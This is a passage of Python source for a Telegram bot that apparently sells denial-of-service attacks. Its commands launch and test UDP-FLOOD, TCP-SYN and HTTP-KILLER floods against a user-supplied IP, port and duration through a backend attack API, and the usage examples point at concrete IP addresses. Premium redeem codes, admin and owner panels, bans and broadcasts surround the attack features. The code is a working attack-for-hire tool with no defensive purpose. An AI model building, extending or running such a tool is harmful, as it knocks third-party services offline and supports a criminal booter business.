        if concurrent < MIN_CONCURRENT or concurrent > MAX_CONCURRENT:
            await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
            return
        
        if duration < MIN_DURATION or duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
            return
        
        attack_id, msg = await attack_manager.start_attack(
            user_id, target, port, duration, method, context, concurrent
        )
        
        if not attack_id:
            await update.message.reply_text(f"❌ {msg}", parse_mode='Markdown')
            return
        
        stats = attack_manager.get_stats()
        
        await update.message.reply_text(
            f"✅ *ATTACK STARTED!*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"📡 Method: `{method}` (UDP-FREE)\n"
            f"🔄 Concurrent: **{concurrent}**\n"
            f"⚡ Status: **RUNNING**\n\n"
            f"⚠️ Only 1 attack at a time!\n"
            f"⏳ Remaining: {duration}s",
            parse_mode='Markdown'
        )
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid port or time!\nError: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can stop attacks!")
        return
    
    success, msg = await attack_manager.stop_attack(user_id)
    
    if success:
        await update.message.reply_text(
            f"🛑 *Attack Stopped!*\n\n{msg}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(f"❌ {msg}")

async def set_concurrent_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set the concurrent value for attacks"""
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can change concurrent settings!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            f"⚡ *CONCURRENT SETTINGS*\n\n"
            f"Current: **{DEFAULT_CONCURRENT}**\n"
            f"Min: {MIN_CONCURRENT}\n"
            f"Max: {MAX_CONCURRENT}\n\n"
            f"Usage: `/setconcurrent 1`",
            parse_mode='Markdown'
        )
        return
    
    try:
        new_concurrent = int(args[0])
        if new_concurrent < MIN_CONCURRENT or new_concurrent > MAX_CONCURRENT:
            await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
            return
        
        global DEFAULT_CONCURRENT
        DEFAULT_CONCURRENT = new_concurrent
        
        await update.message.reply_text(
            f"✅ *Concurrent updated!*\n\n"
            f"New concurrent: **{DEFAULT_CONCURRENT}**\n"
            f"All future attacks will use {DEFAULT_CONCURRENT} concurrent connections.",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid number!")

async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test API with custom parameters"""
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can test API parameters!")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"🔬 *API TEST COMMAND*\n\n"
            f"Usage: `/testapi HOST PORT TIME [CONCURRENT] [METHOD]`\n\n"
            f"Examples:\n"
            f"`/testapi 91.108.9.213 32000 60` (Uses UDP-FLOOD default)\n"
            f"`/testapi 91.108.9.213 32000 60 1` (UDP-FLOOD with 1 concurrent)\n"
            f"`/testapi 91.108.9.213 32000 60 12 TCP-SYN`\n"
            f"`/testapi 91.108.9.213 32000 60 4 HTTP-KILLER`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        # Optional parameters - default to UDP-FLOOD
        concurrent = 1
        method = "UDP-FLOOD"  # Default method
        
        if len(args) > 3:
            try:
                concurrent = int(args[3])
            except ValueError:
                # If it's not a number, it might be a method
                method = args[3].upper()
                if method not in ATTACK_METHODS:
                    method = "UDP-FLOOD"
        
        if len(args) > 4:
            method = args[4].upper()
            if method not in ATTACK_METHODS:
                method = "UDP-FLOOD"
        
        # Show test info
        test_message = (
            f"🔬 *API TEST*\n\n"
            f"📡 Target: `{target}:{port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"🔄 Concurrent: `{concurrent}`\n"
            f"📡 Method: `{method}` (UDP-FREE)\n\n"
            f"⏳ Sending test request..."
        )
        
        status_msg = await update.message.reply_text(test_message, parse_mode='Markdown')
        
        # Send the API request
        result = await send_api_attack(target, port, duration, method, concurrent)
        
        # Build response
        if result.get('success'):
            response_message = (
                f"✅ *API TEST SUCCESSFUL*\n\n"
                f"📡 Target: `{target}:{port}`\n"
                f"🔄 Concurrent: `{concurrent}`\n"
                f"📡 Method: `{method}` (UDP-FREE)\n"
                f"⚡ Status: `{result.get('status')}`\n"
                f"⏱️ Response Time: `{result.get('elapsed', 0):.2f}s`\n\n"
                f"📋 *API Response:*\n```\n{json.dumps(result.get('response', {}), indent=2)[:500]}\n```\n"
            )
        else:
            response_message = (
                f"❌ *API TEST FAILED*\n\n"
                f"📡 Target: `{target}:{port}`\n"
                f"🔄 Concurrent: `{concurrent}`\n"
                f"❌ Error: `{result.get('error', 'Unknown error')}`\n"
                f"📊 Status Code: `{result.get('status')}`\n\n"
                f"📋 *API Response:*\n```\n{json.dumps(result.get('response', {}), indent=2)[:300]}\n```\n"
            )
        
        await status_msg.edit_text(response_message, parse_mode='Markdown')
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid value: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def test_concurrents_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test multiple concurrent values at once"""
    user_id = update.effective_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can test!")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            f"🔬 *TEST CONCURRENT VALUES*\n\n"
            f"Usage: `/testconcs HOST PORT TIME [METHOD]`\n"
            f"Example: `/testconcs 91.108.9.213 32000 60 UDP-FLOOD`\n\n"
            f"This will test: 1, 2, 4, 8, 12, 16 concurrent values",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        method = args[3].upper() if len(args) > 3 else "UDP-FLOOD"
        
        if method not in ATTACK_METHODS:
            method = "UDP-FLOOD"
        
        status_msg = await update.message.reply_text(
            f"🔬 *Testing Concurrent Values...*\n\n"
            f"Target: `{target}:{port}`\n"
            f"Method: `{method}` (UDP-FREE)\n"
            f"Testing: 1, 2, 4, 8, 12, 16\n\n"
            f"⏳ Sending test requests...",
            parse_mode='Markdown'
        )
        
        test_values = [1, 2, 4, 8, 12, 16]
        results = []
        successful_values = []
        
        for concs in test_values:
            result = await send_api_attack(target, port, duration, method, concs)
            
            status = "✅" if result.get('success') else "❌"
            results.append(f"{status} concs={concs} → {result.get('status', 'Error')}")
            
            if result.get('success'):
                successful_values.append(concs)
            
            # Update progress
            await status_msg.edit_text(
                f"🔬 *Testing Concurrent Values...*\n\n"
                f"Target: `{target}:{port}`\n"
                f"Method: `{method}` (UDP-FREE)\n"
                f"Progress: {len(results)}/{len(test_values)}\n\n"
                f"Results:\n" + "\n".join(results),
                parse_mode='Markdown'
            )
            
            await asyncio.sleep(0.5)
        
        # Final results
        final_message = (
            f"🔬 *Concurrent Test Results*\n\n"
            f"Target: `{target}:{port}`\n"
            f"Method: `{method}` (UDP-FREE)\n\n"
            f"*Results:*\n" + "\n".join(results) + "\n\n"
        )
        
        if successful_values:
            highest = max(successful_values)
            final_message += (
                f"💡 *Recommendation:*\n"
                f"• Highest working concurrent: **{highest}**\n"
                f"• Set default: `/setconcurrent {highest}`\n"
                f"• Use in attack: `/attack {target} {port} {duration} {method} {highest}`\n\n"
            )
        else:
            final_message += (
                f"❌ *No concurrent values worked!*\n"
                f"Try using the default API parameters.\n\n"
            )
        
        final_message += (
            f"📋 *Test specific values:*\n"
            f"`/testapi {target} {port} {duration} 1 {method}`\n"
            f"`/testapi {target} {port} {duration} 8 {method}`"
        )
        
        await status_msg.edit_text(final_message, parse_mode='Markdown')
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    users = db.get_all_users()
    
    status_text = "🔴 IDLE" if not stats['is_running'] else f"🟢 ATTACKING {stats['current_target']}"
    
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Status: {status_text}\n"
        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
        f"⏱️ Remaining: {stats['remaining_time']}s\n"
        f"👥 Users: {len(users)}\n"
        f"💥 Attacks: {stats['total_attacks']}\n"
        f"📡 Methods: {len(ATTACK_METHODS)}\n"
        f"📡 Default: UDP-FLOOD (UDP-FREE)\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s",
        parse_mode='Markdown'
    )

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "🎫 *REDEEM CODE*\n\nSend: `/redeem CODE`\nExample: `/redeem ABC123XYZ`",
            parse_mode='Markdown'
        )
        return
    
    code = args[0].upper()
    
    user = db.get_user(user_id)
    if user and user.get('has_used_code'):
        await update.message.reply_text("❌ You already redeemed a code!")
        return
    
    result = db.use_code(code, user_id)
    
    if result:
        plan, expiry = db.get_user_plan(user_id)
        duration_text = "LIFETIME" if result['access_days'] >= 3650 else f"{result['access_days']} days"
        
        await update.message.reply_text(
            f"✅ *CODE REDEEMED!*\n\nCode: `{code}`\nDuration: {duration_text}\n📊 Plan: PREMIUM\n\n🎉 You now have premium access with {DEFAULT_CONCURRENT}x concurrent!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ *INVALID CODE*\n\nThe code is invalid or already used.", parse_mode='Markdown')

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== CALLBACK HANDLERS =====
async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await query.edit_message_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await query.edit_message_text(msg, parse_mode='Markdown')
        return
    
    keyboard = []
    for method in ATTACK_METHODS:
        # Mark UDP-FLOOD as default
        label = f"📡 {method} {'⭐' if method == 'UDP-FLOOD' else ''}"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"method_{method}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="back")])
    
    stats = attack_manager.get_stats()
    
    await query.edit_message_text(
        f"💥 *SELECT ATTACK METHOD*\n\n"
        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
        f"⚠️ Only 1 attack at a time\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
        f"📊 Status: {'🔴 IDLE' if not stats['is_running'] else '🟢 RUNNING'}\n\n"
        f"⭐ UDP-FLOOD is the default method (UDP-FREE)\n\n"
        f"After selecting, send: `IP PORT TIME`\n"
        f"Example: `91.108.17.41 32001 60`\n"
        f"To change concurrent: `IP PORT TIME CONCURRENT`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.replace('method_', '')
    context.user_data['attack_method'] = method
    
    is_default = "⭐ DEFAULT (UDP-FREE)" if method == "UDP-FLOOD" else ""
    
    await query.edit_message_text(
        f"📡 *Method Selected: {method}* {is_default}\n\n"
        f"Send: `IP PORT TIME`\n"
        f"Example: `91.108.17.41 32001 60`\n\n"
        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
        f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
        f"⚠️ Only 1 attack at a time\n"
        f"To change concurrent: `IP PORT TIME CONCURRENT`\n"
        f"Send /cancel to cancel",
        parse_mode='Markdown'
    )

async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    plan, expiry = db.get_user_plan(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    if plan == "free" and not is_owner:
        text = (
            "👤 *MY PLAN*\n\n"
            "📊 Plan: 🆓 FREE\n"
            "⏱️ Status: Inactive\n\n"
            "💡 Use `/redeem CODE` to upgrade."
        )
    else:
        if is_owner:
            text = (
                "👑 *OWNER ACCESS*\n\n"
                "📊 Plan: 💎 PREMIUM (Owner)\n"
                f"⚡ {DEFAULT_CONCURRENT}x Concurrent\n"
                f"📡 {len(ATTACK_METHODS)} Attack Methods\n"
                "📡 Default: UDP-FLOOD (UDP-FREE)\n"
                "⏱️ Unlimited Attacks"
            )
        elif expiry:
            days_left = max(0, (expiry - datetime.now()).days)
            text = (
                "👤 *MY PLAN*\n\n"
                "📊 Plan: 💎 PREMIUM\n"
                f"⏱️ Remaining: {days_left} days\n"
                f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                "📌 Features:\n"
                f"• {DEFAULT_CONCURRENT}x Concurrent\n"
                f"• Only 1 attack at a time\n"
                f"• {len(ATTACK_METHODS)} attack methods\n"
                "• UDP-FLOOD (UDP-FREE) default"
            )
        else:
            text = (
                "👤 *MY PLAN*\n\n"
                "📊 Plan: 💎 PREMIUM\n"
                "⏱️ Status: LIFETIME\n\n"
                "📌 Features:\n"
                f"• {DEFAULT_CONCURRENT}x Concurrent\n"
                f"• Only 1 attack at a time\n"
                f"• {len(ATTACK_METHODS)} attack methods\n"
                "• UDP-FLOOD (UDP-FREE) default"
            )
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    total_attacks = db.get_total_attacks()
    users = db.get_all_users()
    admins = db.get_admins()
    stats = attack_manager.get_stats()
    
    premium_users = sum(1 for u in users if u.get('plan') == 'premium')
    banned_users = len(db.get_banned_users())
    
    status_text = "🔴 IDLE" if not stats['is_running'] else f"🟢 ATTACKING {stats['current_target']}"
    
    await query.edit_message_text(
        f"📊 *BOT STATISTICS*\n\n"
        f"👥 Users: {len(users)}\n"
        f"💎 Premium: {premium_users}\n"
        f"🚫 Banned: {banned_users}\n"
        f"👑 Admins: {len(admins)}\n"
        f"💥 Attacks: {total_attacks}\n"
        f"🔄 Concurrent: {DEFAULT_CONCURRENT}\n"
        f"📡 Default: UDP-FLOOD (UDP-FREE)\n"
        f"⚡ Status: {status_text}\n"
        f"⏱️ Remaining: {stats['remaining_time']}s\n"
        f"📡 Methods: {len(ATTACK_METHODS)}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("🗑️ DELETE UNUSED CODE", callback_data="admin_delete")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("📅 1 DAY", callback_data="gen_1d")],
        [InlineKeyboardButton("📅 3 DAYS", callback_data="gen_3d")],
        [InlineKeyboardButton("📅 7 DAYS", callback_data="gen_7d")],
        [InlineKeyboardButton("📅 30 DAYS", callback_data="gen_30d")],
        [InlineKeyboardButton("📅 LIFETIME", callback_data="gen_lifetime")],
        [InlineKeyboardButton("🔙 BACK", callback_data="admin")]
    ]
    
    await query.edit_message_text(
        "➕ *GENERATE CODE*\n\nSelect duration:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')[1]
    if data == "lifetime":
        days = 3650
    else:
        days = int(data.replace('d', ''))
    
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    if db.create_code(code, days, query.from_user.id):
        duration_text = "LIFETIME" if days >= 3650 else f"{days} days"
        await query.edit_message_text(
            f"✅ *CODE GENERATED*\n\nCode: `{code}`\nDuration: {duration_text}",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to generate code!")

async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes()
    if not codes:
        text = "📋 No codes generated yet."
    else:
        text = "📋 *REDEEM CODES*\n\n"
        for c in codes[:10]:
            status = "✅" if not c.get('is_used') else "❌ Used"
            duration_text = "LIFETIME" if c['access_days'] >= 3650 else f"{c['access_days']}d"
            text += f"`{c['code']}` - {duration_text} - {status}\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes(only_unused=True)
    if not codes:
        await query.edit_message_text(
            "📋 No unused codes to delete!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
        return
    
    keyboard = []
    for c in codes[:10]:
        code = c['code']
        keyboard.append([InlineKeyboardButton(f"❌ {code}", callback_data=f"delunused_{code}")])
    
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="admin")])
    
    await query.edit_message_text(
        "🗑️ *DELETE UNUSED CODES*\n\nSelect a code to delete:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_delete_unused_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    code = query.data.replace('delunused_', '')
    if db.delete_code(code):
        await query.edit_message_text(
            f"✅ Code `{code}` deleted!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to delete code!")

async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📢 *BROADCAST*\n\nSend me the message to broadcast.\nSend /cancel to cancel.",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_broadcast'] = True

async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_broadcast'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_broadcast'] = False
        await update.message.reply_text("✅ Broadcast cancelled.")
        return
    
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        context.user_data['awaiting_broadcast'] = False
        return
    
    users = db.get_all_users()
    total_users = len(users)
    
    if total_users == 0:
        await update.message.reply_text("❌ No users to broadcast to!")
        context.user_data['awaiting_broadcast'] = False
        return
    
    progress_msg = await update.message.reply_text(
        f"📢 *Broadcasting...*\n👥 Total: {total_users}",
        parse_mode='Markdown'
    )
    
    successful = 0
    failed = 0
    message_text = update.message.text
    
    for i, user in enumerate(users):
        user_id2 = user['user_id']
        
        if db.is_banned(user_id2):
            continue
        
        try:
            await context.bot.send_message(
                chat_id=user_id2,
                text=message_text,
                parse_mode='Markdown'
            )
            successful += 1
        except:
            failed += 1
        
        if (i + 1) % 10 == 0:
            try:
                await progress_msg.edit_text(
                    f"📢 *Broadcasting...*\n👥 Progress: {i+1}/{total_users}\n✅ Success: {successful}\n❌ Failed: {failed}",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        await asyncio.sleep(0.05)
    
    await progress_msg.edit_text(
        f"✅ *Broadcast Complete!*\n\n👥 Total: {total_users}\n✅ Successful: {successful}\n❌ Failed: {failed}",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_broadcast'] = False

async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    pause_info = db.get_pause_info()
    pause_status = pause_info.get('paused', False)
    pause_text = "⏸️ PAUSE BOT" if not pause_status else "▶️ RESUME BOT"
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("⚡ SET CONCURRENT", callback_data="owner_concurrent")],
        [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
        [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
        [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
        [InlineKeyboardButton("📋 LIST USERS", callback_data="owner_list_users")],
        [InlineKeyboardButton(pause_text, callback_data="owner_pause")],
        [InlineKeyboardButton("🔌 API STATUS", callback_data="owner_api_status")],
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="owner_stop")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    status_text = "🔴 IDLE" if not stats['is_running'] else f"🟢 ATTACKING {stats['current_target']}"
    
    await query.edit_message_text(
        f"👑 OWNER PANEL\n\n"
        f"Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n"
        f"⚡ Attack: {status_text}\n"
        f"🔄 Concurrent: **{DEFAULT_CONCURRENT}**\n"
        f"📡 Default: UDP-FLOOD (UDP-FREE)\n"
        f"⏱️ Remaining: {stats['remaining_time']}s",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def owner_concurrent_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"⚡ *SET CONCURRENT*\n\n"
        f"Current: **{DEFAULT_CONCURRENT}**\n"
        f"Min: {MIN_CONCURRENT}\n"
        f"Max: {MAX_CONCURRENT}\n\n"
        f"Send: `/setconcurrent NUMBER`\n"
        f"Example: `/setconcurrent 1`\n\n"
        f"⚠️ This affects ALL attacks!",
        parse_mode='Markdown'
    )

async def owner_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    success, msg = await attack_manager.stop_attack(user_id)
    
    if success:
        await query.edit_message_text(
            f"🛑 *Attack Stopped!*\n\n{msg}",
            parse_mode='Markdown'
        )
    else:
        await query.edit_message_text(f"❌ {msg}")

async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    current_pause = db.get_pause_info().get('paused', False)
    
    if current_pause:
        db.set_pause(False, user_id)
        await query.edit_message_text(
            "✅ *Bot Resumed*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        db.set_pause(True, user_id, "Owner paused")
        await query.edit_message_text(
            "⏸️ *Bot Paused*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )

async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "👑 PROMOTE ADMIN\n\nSend: USER_ID\nSend /cancel to cancel"
    )
    context.user_data['awaiting_promote'] = True

async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_promote'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_promote'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        user = db.get_user(user_id)
        
        if not user:
            await update.message.reply_text(f"❌ User {user_id} not found.")
            return
        
        if db.is_admin(user_id):
            await update.message.reply_text(f"❌ User {user_id} is already an admin!")
            return
        
        db.add_admin(user_id, user.get('username', 'Unknown'), "admin", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} promoted to ADMIN!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_promote'] = False

async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    keyboard = []
    
    for admin in admins:
        admin_id = admin['user_id']
        if admin_id != OWNER_ID and admin.get('level') != "pseudo_owner":
            keyboard.append([InlineKeyboardButton(f"❌ {admin_id}", callback_data=f"demote_{admin_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="owner")])
    
    await query.edit_message_text(
        "👑 DEMOTE ADMIN\n\nClick an admin to demote:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = int(query.data.split('_')[1])
    
    if user_id == OWNER_ID:
        await query.edit_message_text("❌ Cannot demote the owner!")
        return
    
    if db.remove_admin(user_id):
        await query.edit_message_text(
            f"✅ Admin {user_id} demoted!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        await query.edit_message_text("❌ Failed to demote!")

async def owner_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🚫 BAN USER\n\nSend user ID to ban:\nSend /cancel to cancel"
    )
    context.user_data['awaiting_ban'] = True

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        
        if user_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot ban the owner!")
            context.user_data['awaiting_ban'] = False
            return
        
        if db.is_admin(user_id):
            await update.message.reply_text("❌ Cannot ban an admin!")
            context.user_data['awaiting_ban'] = False
            return
        
        db.ban_user(user_id, "Banned by owner", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} banned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_ban'] = False

async def owner_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "✅ UNBAN USER\n\nSend user ID to unban:\nSend /cancel to cancel"
    )
    context.user_data['awaiting_unban'] = True

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_unban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        db.unban_user(user_id)
        await update.message.reply_text(f"✅ User {user_id} unbanned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_unban'] = False

async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    if not admins:
        await query.edit_message_text("👑 No admins found.")
        return
    
    text = "👑 ADMIN LIST\n\n"
    for admin in admins:
        level = admin.get('level', 'admin').upper()
        admin_id = admin['user_id']
        text += f"• {admin_id} - {level}\n"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    users = db.get_all_users()
    
    if not users:
        await query.edit_message_text("📋 No users found.")
        return
    
    text = "👥 ALL USERS\n\n"
    for user in users[:20]:
        user_id2 = user.get('user_id')
        username = user.get('username', 'N/A')
        plan = user.get('plan', 'free').upper()
        is_banned = "🚫" if user.get('is_banned') else "✅"
        is_admin = "⭐" if db.is_admin(user_id2) else ""
        text += f"{is_banned}{is_admin} {user_id2} - @{username} ({plan})\n"
    
    if len(users) > 20:
